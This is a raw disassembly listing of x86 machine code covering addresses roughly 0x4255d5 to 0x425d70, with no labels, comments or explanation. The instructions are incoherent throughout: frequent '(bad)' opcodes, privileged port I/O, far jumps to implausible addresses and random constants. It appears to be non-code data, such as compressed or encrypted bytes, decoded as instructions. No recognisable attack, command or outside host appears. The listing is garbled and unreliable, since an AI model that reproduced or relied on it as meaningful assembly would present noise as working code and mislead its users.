  4255d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255d6:	dec    ecx
  4255d7:	test   eax,0xa83b7c7c
  4255dc:	aaa    
  4255dd:	add    BYTE PTR [eax+0x16],ah
  4255e0:	jnp    0x425576
  4255e2:	sti    
  4255e3:	sahf   
  4255e4:	shr    DWORD PTR [ebp+0x251239a8],0xea
  4255eb:	push   0xb
  4255ed:	ins    BYTE PTR es:[edi],dx
  4255ee:	mov    ds:0xdf0f8ad8,al
  4255f3:	cmp    al,0xf3
  4255f5:	add    DWORD PTR [eax],ecx
  4255f7:	retf   
  4255f8:	js     0x42563f
  4255fa:	(bad)  
  4255fb:	adc    al,0x3a
  4255fd:	call   0xe53933c3
  425602:	cli    
  425603:	sub    dh,al
  425605:	jb     0x42563d
  425607:	ret    0xa5b3
  42560a:	fdivr  st(4),st
  42560c:	xchg   ebx,eax
  42560d:	leave  
  42560e:	cmp    BYTE PTR [edi-0x450ec309],ch
  425614:	sbb    eax,0x3442ea33
  425619:	inc    eax
  42561a:	xor    al,0x30
  42561c:	push   0x74
  42561e:	jbe    0x4255ec
  425620:	fwait
  425621:	xor    al,0xe5
  425623:	mov    edi,DWORD PTR [ecx+0x776748b4]
  425629:	jmp    0x67d8c1bd
  42562e:	js     0x425682
  425630:	test   al,0x40
  425632:	mov    ch,BYTE PTR [edx]
  425634:	icebp  
  425635:	outs   dx,DWORD PTR ds:[esi]
  425636:	ins    DWORD PTR es:[edi],dx
  425637:	push   cs
  425638:	stc    
  425639:	adc    DWORD PTR [esi-0x77],edx
  42563c:	push   ebx
  42563d:	and    al,0xa4
  42563f:	ds stc 
  425641:	sub    bl,bh
  425643:	lds    esi,FWORD PTR [esi]
  425645:	jno    0x425650
  425647:	jae    0x425680
  425649:	xchg   edx,eax
  42564a:	or     BYTE PTR [edx+ecx*2+0x1b],0xa7
  42564f:	jno    0x425604
  425651:	iret   
  425652:	int    0x84
  425654:	test   al,0x38
  425656:	sub    eax,0x376175d
  42565b:	loope  0x42560d
  42565d:	and    BYTE PTR [edx-0x783a534a],dh
  425663:	mov    edx,DWORD PTR [ebp-0x68f32860]
  425669:	inc    ebp
  42566a:	xchg   ebp,eax
  42566b:	mov    bh,0x7d
  42566d:	or     bh,BYTE PTR [edi-0x57]
  425670:	call   FWORD PTR [ecx*1-0x53d695c0]
  425677:	mov    edx,0xbf57d664
  42567c:	retf   
  42567d:	jle    0x4256c5
  42567f:	(bad)  
  425680:	out    0xb0,al
  425682:	stos   DWORD PTR es:[edi],eax
  425683:	xchg   ebp,eax
  425684:	fld    DWORD PTR [edx+0x6620731f]
  42568a:	icebp  
  42568b:	or     DWORD PTR [edi-0x4361d5d5],0xffffffe1
  425692:	xchg   edx,eax
  425693:	add    DWORD PTR [ecx+eax*4-0x51],edi
  425697:	into   
  425698:	adc    al,0x39
  42569a:	jecxz  0x425710
  42569c:	adc    esi,DWORD PTR [edx+0x5aa7e0f7]
  4256a2:	dec    eax
  4256a3:	je     0x4256d6
  4256a5:	xchg   ecx,eax
  4256a6:	int    0x9e
  4256a8:	and    al,0xe4
  4256aa:	iret   
  4256ab:	(bad)  
  4256ac:	push   esp
  4256ad:	inc    esp
  4256ae:	cmp    ecx,DWORD PTR [ecx]
  4256b0:	dec    esi
  4256b1:	pusha  
  4256b2:	and    dl,BYTE PTR [ecx-0x197f0fd5]
  4256b8:	ins    BYTE PTR es:[edi],dx
  4256b9:	ins    BYTE PTR es:[edi],dx
  4256ba:	mov    ch,0x23
  4256bc:	and    cl,dh
  4256be:	sar    BYTE PTR [edx+0x7f],cl
  4256c1:	pop    es
  4256c2:	mov    ch,0x3
  4256c4:	inc    ebx
  4256c5:	outs   dx,BYTE PTR ds:[esi]
  4256c6:	sub    edx,DWORD PTR [ebp+0x36]
  4256c9:	(bad)  
  4256ca:	sbb    al,0x98
  4256cc:	xor    ecx,DWORD PTR [edi-0x693f1a28]
  4256d2:	retf   0x8c7d
  4256d5:	imul   eax,eax,0x85aef5e
  4256db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256dc:	sub    eax,0xc3717965
  4256e1:	popa   
  4256e2:	cld    
  4256e3:	inc    edi
  4256e4:	gs mov ch,0xee
  4256e7:	mov    ebp,0x97415982
  4256ec:	call   0xba1c7c88
  4256f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256f2:	pusha  
  4256f3:	cli    
  4256f4:	fisttp QWORD PTR [edi]
  4256f6:	dec    ebx
  4256f7:	sub    DWORD PTR [ecx],0xffffff89
  4256fa:	or     al,al
  4256fc:	jb     0x4256f5
  4256fe:	jno    0x42575b
  425700:	out    dx,eax
  425701:	mov    edx,0xb87c8ec
  425706:	mov    db0,ebp
  425709:	mov    esp,esi
  42570b:	retf   
  42570c:	inc    ebp
  42570d:	fisttp DWORD PTR [edi-0x27]
  425710:	fwait
  425711:	cmp    al,0x83
  425713:	xor    DWORD PTR [ecx+0x200bb66c],ecx
  425719:	jae    0x425747
  42571b:	stc    
  42571c:	lock je 0x4256e7
  42571f:	jae    0x4256bb
  425721:	jne    0x425798
  425723:	fst    QWORD PTR [eax]
  425725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425726:	push   ds
  425727:	pusha  
  425728:	pop    ecx
  425729:	jle    0x425766
  42572b:	sub    BYTE PTR [esi],cl
  42572d:	xchg   esi,eax
  42572e:	clc    
  42572f:	fcom   QWORD PTR [edx+0x5a]
  425732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425733:	sbb    bl,BYTE PTR [edi-0x5e]
  425736:	jle    0x425748
  425738:	aad    0xb0
  42573a:	dec    edi
  42573b:	hlt    
  42573c:	addr16 lock out 0x3,al
  425740:	sub    BYTE PTR [edx],dh
  425742:	popa   
  425743:	cs test bh,0xc3
  425747:	sbb    DWORD PTR [ebp+0x6d],ebx
  42574a:	add    dh,BYTE PTR [ecx]
  42574c:	jb     0x425709
  42574e:	es mov esp,0x7796b43d
  425754:	mov    cl,0xcf
  425756:	xor    BYTE PTR [ebx+ecx*2-0x6f],ch
  42575a:	adc    WORD PTR [eax],ax
  42575d:	stc    
  42575e:	loop   0x4256e7
  425760:	inc    ebp
  425761:	je     0x425765
  425763:	(bad)
  425766:	xchg   esp,eax
  425767:	push   ss
  425768:	sub    al,0x40
  42576a:	jns    0x425758
  42576c:	sbb    eax,0xb91dd964
  425771:	xor    BYTE PTR [eax],bl
  425773:	push   edx
  425774:	shr    BYTE PTR [edi+0x2b094733],cl
  42577a:	and    edi,edi
  42577c:	or     DWORD PTR [esi+0x62],esp
  42577f:	outs   dx,BYTE PTR ds:[esi]
  425780:	adc    eax,DWORD PTR [ecx+eax*2]
  425783:	outs   dx,DWORD PTR ds:[esi]
  425784:	fdivr  st,st(7)
  425786:	pop    ebx
  425787:	inc    ebp
  425788:	mov    esi,0x2f439256
  42578d:	ins    DWORD PTR es:[edi],dx
  42578e:	mov    esi,0xd8b5c518
  425793:	int3   
  425794:	mov    ch,BYTE PTR [edx+0x3b]
  425797:	loopne 0x42573a
  425799:	cs je  0x42575a
  42579c:	push   es
  42579d:	sub    ecx,ebp
  42579f:	vpcmpeqd xmm1,xmm3,xmm1
  4257a3:	and    esp,ecx
  4257a5:	popf   
  4257a6:	inc    esp
  4257a7:	jns    0x4257b2
  4257a9:	out    0x33,al
  4257ab:	sar    edi,1
  4257ad:	iret   
  4257ae:	inc    edi
  4257af:	push   edx
  4257b0:	lock lea esi,[ecx+0x55bb1f8e]
  4257b7:	xor    eax,0x3fd82cb2
  4257bc:	cmp    DWORD PTR [ecx-0x15],edi
  4257bf:	cmp    BYTE PTR [edx-0x5ea87fe2],ah
  4257c5:	das    
  4257c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257c7:	push   esi
  4257c8:	stos   BYTE PTR es:[edi],al
  4257c9:	cmp    bl,BYTE PTR [edi-0x6bd463c2]
  4257cf:	sbb    ecx,DWORD PTR [edi+0x30e231df]
  4257d5:	fucomip st,st(0)
  4257d7:	cmp    eax,0x2223610c
  4257dc:	mov    edi,0xa514077f
  4257e1:	push   ss
  4257e2:	mov    DWORD PTR [ebx-0x52b844ca],ebx
  4257e8:	mov    ebp,0x1648562c
  4257ed:	in     eax,0x7f
  4257ef:	cmp    esp,0xa42f4067
  4257f5:	inc    edx
  4257f6:	ja     0x425808
  4257f8:	inc    ebx
  4257f9:	add    BYTE PTR [eax],al
  4257fb:	add    BYTE PTR [edx-0x101610a7],bl
  425801:	call   FWORD PTR [esi+0x5c5d437b]
  425807:	mov    cl,0x7e
  425809:	out    dx,eax
  42580a:	jmp    0x8500:0x1d0d4a9
  425811:	add    al,BYTE PTR [eax]
  425813:	add    BYTE PTR [esi-0x1a],bh
  425816:	push   ebp
  425817:	cmp    dh,BYTE PTR [edi-0x7a194923]
  42581d:	std    
  42581e:	xchg   BYTE PTR [esi],ch
  425820:	loopne 0x4257f5
  425822:	sub    esi,ecx
  425824:	js     0x4257b8
  425826:	adc    BYTE PTR [edi-0x491fc02a],cl
  42582c:	(bad)  
  42582d:	iret   
  42582e:	scas   eax,DWORD PTR es:[edi]
  42582f:	mov    ds:0x166e5508,eax
  425834:	int3   
  425835:	sub    al,BYTE PTR [ebp-0x2e]
  425838:	xor    eax,0xd2f51619
  42583d:	repnz in eax,0xb9
  425840:	pop    ebx
  425841:	xchg   esp,eax
  425842:	inc    esp
  425843:	test   al,0x60
  425845:	scas   eax,DWORD PTR es:[edi]
  425846:	sahf   
  425847:	cwde   
  425848:	sub    dh,BYTE PTR [esp+eax*8-0x78]
  42584c:	xchg   ebp,eax
  42584d:	mov    dl,0x4
  42584f:	mov    eax,0x2a21202a
  425854:	add    esi,DWORD PTR [ecx-0x70]
  425857:	push   edi
  425858:	sub    BYTE PTR [esi+eax*8-0x7592cf8a],cl
  42585f:	out    0xbb,eax
  425861:	retf   
  425862:	xor    dl,BYTE PTR [eax+0x2e]
  425865:	cmp    al,0xa9
  425867:	ins    DWORD PTR es:[edi],dx
  425868:	stos   BYTE PTR es:[edi],al
  425869:	dec    esp
  42586a:	xor    ebp,DWORD PTR [ebp+0x1f99164e]
  425870:	sub    eax,0xcba79866
  425875:	mov    bh,0x27
  425877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425878:	sbb    al,BYTE PTR [ebp-0x1047220a]
  42587e:	rcr    BYTE PTR [ecx+0x72],0xb3
  425882:	push   cs
  425883:	jl     0x4258fc
  425885:	bound  ecx,QWORD PTR [ebx-0x2df495ed]
  42588b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42588d:	addr16 inc esi
  42588f:	(bad)  
  425890:	mov    ds:0x3e3fff2b,al
  425895:	jae    0x425877
  425897:	pop    ss
  425898:	pop    edx
  425899:	je     0x4258f8
  42589b:	lea    edx,[edi+0x55ba09fd]
  4258a1:	xchg   esi,eax
  4258a2:	push   cs
  4258a3:	lods   eax,DWORD PTR ds:[esi]
  4258a4:	and    BYTE PTR ss:[edx],dl
  4258a7:	and    al,0x6c
  4258a9:	mov    dh,0x5
  4258ab:	adc    BYTE PTR [ecx],0x27
  4258ae:	dec    esi
  4258af:	and    dl,BYTE PTR [eax-0x3f]
  4258b2:	jle    0x425880
  4258b4:	sub    BYTE PTR [edi-0x1e],ah
  4258b7:	(bad)  
  4258b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258ba:	in     al,dx
  4258bb:	imul   edi,ecx,0x23b682a0
  4258c1:	retf   
  4258c2:	adc    DWORD PTR ds:0xc73af348,edi
  4258c8:	in     al,0x77
  4258ca:	adc    BYTE PTR [ecx-0x3097f127],cl
  4258d0:	fwait
  4258d1:	adc    eax,0x1009d32b
  4258d6:	push   edx
  4258d7:	mov    ebx,0x5960f7f2
  4258dc:	les    ebx,FWORD PTR [edx+ecx*2-0x99b8cb4]
  4258e3:	adc    al,0xf6
  4258e5:	loop   0x425940
  4258e7:	sbb    al,0xb
  4258e9:	jg     0x42591c
  4258eb:	or     BYTE PTR [edi+0x6f99a7f5],0x5a
  4258f2:	mov    al,ds:0x6e8d2c67
  4258f7:	ins    BYTE PTR es:[edi],dx
  4258f8:	xchg   ecx,eax
  4258f9:	and    esi,DWORD PTR [eax-0x24]
  4258fc:	inc    esp
  4258fd:	into   
  4258fe:	pop    ds
  4258ff:	stos   DWORD PTR es:[edi],eax
  425900:	pop    esi
  425901:	mov    WORD PTR [ebx+0x65],es
  425904:	xor    DWORD PTR [ebx+0x52],esp
  425907:	fs dec eax
  425909:	xchg   ebx,eax
  42590a:	(bad)  
  42590b:	mov    esp,0x2f2cb5c8
  425910:	push   cs
  425911:	mov    eax,0x4aae19c
  425916:	dec    edi
  425917:	or     eax,0x828d5a65
  42591c:	outs   dx,DWORD PTR ds:[esi]
  42591d:	mov    al,ds:0x2bea4c43
  425922:	cwde   
  425923:	inc    eax
  425924:	js     0x42596c
  425926:	adc    ebx,ebp
  425928:	mov    al,0xf8
  42592a:	pop    edi
  42592b:	and    BYTE PTR [eax+0x542b3498],0xdc
  425932:	mov    bh,0xee
  425934:	xor    dl,BYTE PTR [eax]
  425936:	jae    0x4258f9
  425938:	push   eax
  425939:	sbb    al,0xdc
  42593b:	(bad)  
  42593c:	adc    bh,BYTE PTR [ecx]
  42593e:	and    dh,dh
  425940:	(bad)  
  425941:	mov    ebp,0xa63f7eff
  425946:	je     0x42596a
  425948:	xor    cl,BYTE PTR [ebx]
  42594a:	fnop   
  42594c:	popa   
  42594d:	and    al,0xf3
  42594f:	mov    ds:0x66238a00,al
  425954:	mov    esi,0xc1fccfc0
  425959:	push   eax
  42595a:	mov    ds:0xc6b365e6,eax
  42595f:	(bad)  
  425960:	outs   dx,DWORD PTR ds:[esi]
  425961:	and    al,0x0
  425963:	out    dx,al
  425964:	lahf   
  425965:	jle    0x425925
  425967:	or     eax,0xf1c621cf
  42596c:	pop    esp
  42596d:	loope  0x4259cb
  42596f:	mov    al,BYTE PTR [edx-0xdd1da46]
  425975:	aad    0x20
  425977:	sub    DWORD PTR [ecx+0x52c80ece],edi
  42597d:	in     al,dx
  42597e:	outs   dx,BYTE PTR ds:[esi]
  42597f:	or     DWORD PTR [edx-0xe8c07e3],esi
  425985:	out    0xfe,al
  425987:	bound  ecx,QWORD PTR [eax+0x6cd62398]
  42598d:	sbb    ah,BYTE PTR [esi-0x23]
  425990:	cld    
  425991:	les    ecx,FWORD PTR [esi]
  425993:	dec    ebp
  425994:	sbb    BYTE PTR [edi],bl
  425996:	pop    ecx
  425997:	das    
  425998:	mov    WORD PTR [eax-0x2c],fs
  42599b:	push   ss
  42599c:	mov    ah,0xf1
  42599e:	ja     0x425991
  4259a0:	xor    cl,BYTE PTR [ecx-0x4c]
  4259a3:	dec    edi
  4259a4:	inc    edx
  4259a5:	pop    ds
  4259a6:	aaa    
  4259a7:	psubusw mm4,mm5
  4259aa:	mov    esi,0x5c39cbca
  4259af:	retf   
  4259b0:	inc    DWORD PTR [edx]
  4259b2:	pusha  
  4259b3:	and    eax,0x7d246bf6
  4259b8:	adc    esp,ebx
  4259ba:	fiadd  WORD PTR [edi+0x72]
  4259bd:	fstp   TBYTE PTR [ecx]
  4259bf:	mov    edx,0x61ddd921
  4259c4:	shl    BYTE PTR [edx+0x47],1
  4259c7:	dec    eax
  4259c8:	test   al,0xf0
  4259ca:	test   DWORD PTR [eax],esi
  4259cc:	sbb    eax,0xfbbd967b
  4259d1:	pop    edx
  4259d2:	mov    esp,0x6a244efb
  4259d7:	or     esi,0x994b96a9
  4259dd:	xor    DWORD PTR [ebp+0x60],ebx
  4259e0:	in     al,dx
  4259e1:	sbb    bl,BYTE PTR [ecx+0x1c388250]
  4259e7:	loope  0x4259e0
  4259e9:	(bad)  
  4259eb:	ja     0x425a29
  4259ed:	ins    DWORD PTR es:[edi],dx
  4259ee:	mov    edi,DWORD PTR [ebx+edx*1+0x1f]
  4259f2:	push   esi
  4259f3:	das    
  4259f4:	dec    esp
  4259f5:	imul   eax,DWORD PTR es:[eax+0x661c476b],0x3a33e675
  425a00:	dec    esi
  425a01:	mov    al,0xa5
  425a03:	(bad)  
  425a04:	fsub   st,st(2)
  425a06:	cdq    
  425a07:	ret    0x2f68
  425a0a:	mov    cl,0xd4
  425a0c:	xor    eax,0x99763b6
  425a11:	data16 je 0x425a40
  425a14:	sti    
  425a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a16:	je     0x425a77
  425a18:	or     al,0x95
  425a1a:	repz hlt 
  425a1c:	sbb    esp,esi
  425a1e:	sub    cl,BYTE PTR ds:0x6dfb1a21
  425a24:	inc    ebx
  425a25:	leave  
  425a26:	aas    
  425a27:	sbb    al,BYTE PTR [edx-0x14]
  425a2a:	pop    ss
  425a2b:	mov    cl,0x64
  425a2d:	mov    edi,0x6f0201cc
  425a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a33:	sbb    BYTE PTR [ebp+0x38322aae],0xd8
  425a3a:	mov    BYTE PTR [edx],cl
  425a3c:	adc    eax,0xf3a19f54
  425a41:	fcmovb st,st(5)
  425a43:	repnz stos BYTE PTR es:[edi],al
  425a45:	xchg   edi,eax
  425a46:	div    BYTE PTR ds:0xade23c9f
  425a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a4d:	test   DWORD PTR [ecx*8+0x315230f3],edx
  425a54:	mov    eax,DWORD PTR [ebp-0x63]
  425a57:	shld   DWORD PTR [ebx+ecx*2+0x21],edx,cl
  425a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a5d:	outs   dx,BYTE PTR ds:[esi]
  425a5e:	mov    bl,0xce
  425a60:	sub    eax,0xab79b43a
  425a65:	rcr    DWORD PTR ds:0x45fde8b4,1
  425a6b:	call   0xc91ed6be
  425a70:	sar    DWORD PTR [edi+0x907a791],cl
  425a76:	in     al,dx
  425a77:	pop    esi
  425a78:	(bad)  
  425a79:	dec    ebp
  425a7a:	inc    ebx
  425a7b:	aam    0xc7
  425a7d:	dec    ecx
  425a7e:	sub    BYTE PTR [ebp-0x3a],0x8
  425a82:	mov    edi,DWORD PTR [ebx]
  425a84:	xchg   esi,eax
  425a85:	cld    
  425a86:	add    al,0xd7
  425a88:	push   esp
  425a89:	fnstcw WORD PTR [ebp+0x25]
  425a8c:	inc    ebp
  425a8d:	add    ch,BYTE PTR [edx-0x19]
  425a90:	xchg   edx,eax
  425a91:	test   bl,bh
  425a93:	cs pop eax
  425a95:	adc    BYTE PTR [ecx+edi*1+0x6],dh
  425a9c:	(bad)  
  425a9d:	rol    BYTE PTR [edi],0x37
  425aa0:	dec    edi
  425aa1:	idiv   DWORD PTR [ebp+0x532a00fa]
  425aa7:	fnsave [ebp+0x73]
  425aaa:	dec    ecx
  425aab:	dec    ecx
  425aac:	pop    ecx
  425aad:	rol    DWORD PTR [ecx],cl
  425aaf:	add    BYTE PTR [ebp+0x14000002],al
  425ab5:	icebp  
  425ab6:	sbb    eax,0x945b4975
  425abb:	scas   al,BYTE PTR es:[edi]
  425abc:	jo     0x425ab3
  425abe:	sub    al,0xb3
  425ac0:	aas    
  425ac1:	dec    esi
  425ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ac3:	pop    ss
  425ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ac5:	pusha  
  425ac6:	and    eax,0xcbf92cf1
  425acb:	idiv   ch
  425acd:	scas   al,BYTE PTR es:[edi]
  425ace:	jmp    0x425b26
  425ad0:	out    dx,eax
  425ad1:	or     cl,BYTE PTR [esi]
  425ad3:	mov    esi,0x97b8c1e7
  425ad8:	in     al,0xf9
  425ada:	loopne 0x425b1e
  425adc:	arpl   WORD PTR [edx],bx
  425ade:	xor    al,0xb2
  425ae0:	pop    eax
  425ae1:	push   ss
  425ae2:	cmp    al,0x54
  425ae4:	mov    esi,DWORD PTR [esi+edi*2]
  425ae7:	out    0x48,al
  425ae9:	outs   dx,BYTE PTR ds:[esi]
  425aea:	add    edx,DWORD PTR [edx+0x62]
  425aed:	mov    al,0xc6
  425aef:	aad    0xc1
  425af1:	ins    BYTE PTR es:[edi],dx
  425af2:	inc    eax
  425af3:	jecxz  0x425abd
  425af5:	jl     0x425ad5
  425af7:	dec    esp
  425af8:	int    0x6f
  425afa:	out    0x56,al
  425afc:	push   DWORD PTR [edi+ecx*4]
  425aff:	pop    edi
  425b00:	push   es
  425b01:	sbb    edi,esp
  425b03:	adc    cl,BYTE PTR [ebx+0x73]
  425b06:	mov    ecx,0x5ddf2c77
  425b0b:	add    DWORD PTR [ecx+0x58],ebp
  425b0e:	jbe    0x425b44
  425b10:	xlat   BYTE PTR ds:[ebx]
  425b11:	stos   DWORD PTR es:[edi],eax
  425b12:	out    0x49,al
  425b14:	ja     0x425ab3
  425b16:	push   ss
  425b17:	or     eax,0x70a6fc10
  425b1c:	xchg   BYTE PTR [eax+ebx*8],dh
  425b1f:	scas   al,BYTE PTR es:[edi]
  425b20:	in     al,0x46
  425b22:	push   edx
  425b23:	cld    
  425b24:	retf   0x9b3d
  425b27:	iret   
  425b28:	aaa    
  425b29:	retf   0xb438
  425b2c:	ror    ch,1
  425b2e:	cmp    dl,BYTE PTR [edi-0x3ce6640f]
  425b34:	out    dx,al
  425b35:	int3   
  425b36:	fdivr  QWORD PTR [edi-0x33]
  425b39:	push   esi
  425b3a:	(bad)  
  425b3b:	(bad)  
  425b3c:	in     al,dx
  425b3d:	inc    ecx
  425b3e:	jp     0x425b76
  425b40:	dec    ebp
  425b41:	xchg   ebx,eax
  425b42:	or     eax,edx
  425b44:	das    
  425b45:	test   DWORD PTR [ebx-0x7f9fd1d2],ebp
  425b4b:	xor    bh,BYTE PTR ds:0x69afabfd
  425b51:	out    dx,al
  425b52:	mov    DWORD PTR [ebx-0x6a],esi
  425b55:	(bad)  [edi+0xfda0ed5]
  425b5b:	gs xchg edi,eax
  425b5d:	push   esp
  425b5e:	in     eax,dx
  425b5f:	in     al,dx
  425b60:	pop    ebp
  425b61:	xor    eax,0xa1aea5f4
  425b66:	lds    esi,FWORD PTR [edi+0x58]
  425b69:	mov    ds:0xd0bd04b2,eax
  425b6e:	shl    BYTE PTR [ecx],1
  425b70:	lds    esp,FWORD PTR [ebx-0x2a]
  425b73:	cwde   
  425b74:	mov    ecx,0x2ad8bdc9
  425b79:	fdiv   DWORD PTR ds:0xb7ca29c4
  425b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b80:	(bad)  
  425b81:	stos   DWORD PTR es:[edi],eax
  425b82:	inc    esp
  425b83:	fnstsw WORD PTR [edi+0x2bd32d81]
  425b89:	xchg   edx,eax
  425b8a:	jns    0x425b3a
  425b8c:	xor    BYTE PTR [edx],ah
  425b8e:	fistp  WORD PTR [edi]
  425b90:	jmp    0x425b40
  425b92:	out    0x8c,eax
  425b94:	clc    
  425b95:	sbb    eax,0x12f549f6
  425b9a:	gs pop esp
  425b9c:	push   edx
  425b9d:	mov    dh,0x49
  425b9f:	xor    al,0xf2
  425ba1:	cmp    edi,ebp
  425ba3:	push   edx
  425ba4:	mov    dh,0xc0
  425ba6:	mov    esp,0x2356918c
  425bab:	stc    
  425bac:	sti    
  425bad:	repnz mov esp,0xdcd54555
  425bb3:	mov    ebx,0x88d95901
  425bb8:	jge    0x425bda
  425bba:	test   al,0x1a
  425bbc:	aad    0x2c
  425bbe:	stos   BYTE PTR es:[edi],al
  425bbf:	xchg   edx,eax
  425bc0:	repnz pop ds
  425bc2:	mov    ebx,DWORD PTR [eax-0x7542edbd]
  425bc8:	loop   0x425b80
  425bca:	jp     0x425b82
  425bcc:	xchg   esp,eax
  425bcd:	lea    edx,[esi+0x21]
  425bd0:	addr16 push 0xa84aa7c8
  425bd6:	mov    dl,0xd9
  425bd8:	mov    bl,0x13
  425bda:	mov    ecx,0x23e9ee53
  425bdf:	xchg   esp,eax
  425be0:	js     0x425bb6
  425be2:	mov    al,ds:0x2c0b83aa
  425be7:	add    al,0x9d
  425be9:	mov    dh,0x0
  425beb:	push   ebp
  425bec:	fist   DWORD PTR ds:0x3e90af65
  425bf2:	xchg   ebp,eax
  425bf3:	shl    DWORD PTR [ecx-0x2d],1
  425bf6:	inc    esp
  425bf7:	sti    
  425bf8:	test   BYTE PTR [ebx+ebp*4-0x14],0x6
  425bfd:	popa   
  425bfe:	jecxz  0x425c0e
  425c00:	fwait
  425c01:	scas   al,BYTE PTR es:[edi]
  425c02:	cmp    BYTE PTR [eax-0x6d944de3],0x4f
  425c09:	jno    0x425c64
  425c0b:	retf   0xea17
  425c0e:	push   es
  425c0f:	int    0x45
  425c11:	mov    es,WORD PTR [ebx-0x50]
  425c14:	gs repnz sti 
  425c17:	in     al,0x71
  425c19:	ja     0x425c3b
  425c1b:	xchg   edi,eax
  425c1c:	mov    ebx,0xa02806ab
  425c21:	loope  0x425be9
  425c23:	sti    
  425c24:	arpl   WORD PTR [edi],si
  425c26:	xlat   BYTE PTR ds:[ebx]
  425c27:	add    eax,0x4b9f052e
  425c2c:	inc    esp
  425c2d:	les    ebx,FWORD PTR [edi]
  425c2f:	out    0x9c,al
  425c31:	stos   BYTE PTR es:[edi],al
  425c32:	pop    edi
  425c33:	push   ds
  425c34:	fxtract 
  425c36:	jo     0x425bbf
  425c38:	push   ds
  425c39:	xor    ebp,0xbb6d8da6
  425c3f:	sub    dh,BYTE PTR [ebx]
  425c41:	mov    ecx,0xa6c66675
  425c46:	and    al,0xb1
  425c48:	push   es
  425c49:	ins    DWORD PTR es:[edi],dx
  425c4a:	inc    ebx
  425c4b:	add    dl,BYTE PTR [ebx-0x6e0c5ef]
  425c51:	popa   
  425c52:	pop    ds
  425c53:	push   cs
  425c54:	(bad)  
  425c55:	pop    ss
  425c56:	mov    eax,ds:0x746ab71e
  425c5b:	bound  esp,QWORD PTR [ecx-0x4f]
  425c5e:	xchg   dl,cl
  425c60:	push   cs
  425c61:	cli    
  425c62:	jl     0x425ca1
  425c64:	rcl    DWORD PTR ds:[ebx],0x24
  425c68:	retf   0x7da1
  425c6b:	into   
  425c6c:	sbb    BYTE PTR [ebp-0x14b8c104],ch
  425c72:	mov    esi,?
  425c74:	push   edx
  425c75:	cdq    
  425c76:	xor    esi,edi
  425c78:	add    ch,dh
  425c7a:	xor    al,0x12
  425c7c:	xor    ch,BYTE PTR [edx+eax*4-0x16c2c0f3]
  425c83:	or     eax,0x9b111557
  425c88:	sub    esp,DWORD PTR [ebp+0x6b09813f]
  425c8e:	jmp    0xca0f:0xe7616737
  425c95:	jmp    0x425ccc
  425c97:	jmp    0xb3590dcd
  425c9c:	enter  0xad9,0xd1
  425ca0:	mov    esi,0x1d868888
  425ca5:	js     0x425ca7
  425ca7:	sbb    bh,0x89
  425caa:	push   es
  425cab:	pop    edi
  425cac:	int3   
  425cad:	fwait
  425cae:	dec    ebx
  425cb0:	loope  0x425c47
  425cb2:	mov    esi,0x65031ac4
  425cb7:	mov    ah,BYTE PTR [ecx]
  425cb9:	xchg   edi,eax
  425cba:	data16 mov ah,0xfe
  425cbd:	leave  
  425cbe:	ret    
  425cbf:	mov    ds:0x38536536,al
  425cc4:	mov    ah,0xd9
  425cc6:	ficom  DWORD PTR [edi+0x3fb1d7fe]
  425ccc:	add    eax,0x7eee126d
  425cd1:	outs   dx,BYTE PTR ds:[esi]
  425cd2:	mov    esp,0x277f080a
  425cd7:	and    BYTE PTR [edx],al
  425cd9:	inc    ebp
  425cda:	out    dx,eax
  425cdb:	enter  0x63bb,0x41
  425cdf:	push   cs
  425ce0:	dec    eax
  425ce1:	sub    al,0x33
  425ce3:	dec    edx
  425ce4:	leave  
  425ce5:	mov    esp,esi
  425ce7:	jo     0x425cd2
  425ce9:	cs dec esp
  425ceb:	(bad)  
  425cec:	rcr    bl,1
  425cee:	stos   DWORD PTR es:[edi],eax
  425cef:	fimul  DWORD PTR [esi-0x6be31345]
  425cf5:	neg    BYTE PTR [ebp+ebx*1-0x2c57126c]
  425cfc:	inc    ebp
  425cfd:	(bad)  
  425cfe:	jns    0x425d7e
  425d00:	mov    esi,0x647b4927
  425d05:	adc    ah,BYTE PTR [edi+0xd9fa5ab]
  425d0b:	mov    esi,0xe324160c
  425d10:	adc    eax,DWORD PTR [ebx]
  425d12:	and    al,0x16
  425d14:	and    dl,BYTE PTR [esi-0x43]
  425d17:	pop    ebp
  425d18:	imul   ebp,ebx,0x20358c49
  425d1e:	fcomp  DWORD PTR [eax+0x24]
  425d21:	inc    edi
  425d22:	adc    ah,BYTE PTR [ebx-0x72019206]
  425d28:	push   eax
  425d29:	fcom   DWORD PTR [edx+0x7d]
  425d2c:	imul   edx,DWORD PTR [ebx+ebp*1+0x2],0xa0286291
  425d34:	add    eax,esp
  425d36:	mov    ds:0x6c7d,eax
  425d3b:	add    BYTE PTR [eax-0x57e1776],dh
  425d41:	jecxz  0x425d3c
  425d43:	mov    ebx,0x99242062
  425d48:	dec    esp
  425d49:	test   DWORD PTR [esi],edx
  425d4b:	pop    ebp
  425d4c:	(bad)  
  425d4e:	add    DWORD PTR [eax],eax
  425d50:	test   DWORD PTR [edx],eax
  425d52:	add    BYTE PTR [eax],al
  425d54:	cmp    DWORD PTR [eax+0x4f],eax
  425d57:	cmp    esp,DWORD PTR [ebp-0x7568bc46]
  425d5d:	mov    esi,edi
  425d5f:	mov    dl,0xd9
  425d61:	out    0xa2,al
  425d63:	imul   DWORD PTR [ebx-0x18a2cab7]
  425d69:	in     eax,0x1b
  425d6b:	jg     0x425d80
  425d6d:	ret    0x62a8
  425d70:	cmp    ax,0xefe
